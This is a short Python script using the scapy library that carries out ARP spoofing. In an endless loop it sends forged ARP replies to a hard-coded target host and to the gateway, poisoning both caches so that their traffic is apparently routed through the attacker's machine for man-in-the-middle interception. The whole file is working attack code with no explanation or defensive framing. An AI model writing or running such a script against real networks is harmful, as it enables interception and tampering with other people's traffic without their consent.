import scapy.all as scapy

def spoof(target_ip, target_mac, gateway_ip):
    packet = scapy.ARP(
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        op="is-at"
    )
    scapy.send(packet, verbose=0)

gateway_ip = "192.168.68.1"
getway_mac = "58:04:4f:ad:af:68"
target_ip = "192.168.68.64"
target_mac = "dc:c4:9c:9f:b1:dc"


while True:
    spoof(target_ip, target_mac, gateway_ip)
    spoof(gateway_ip, getway_mac, target_ip) #spoofing the router as well
    print("Spoofing target...")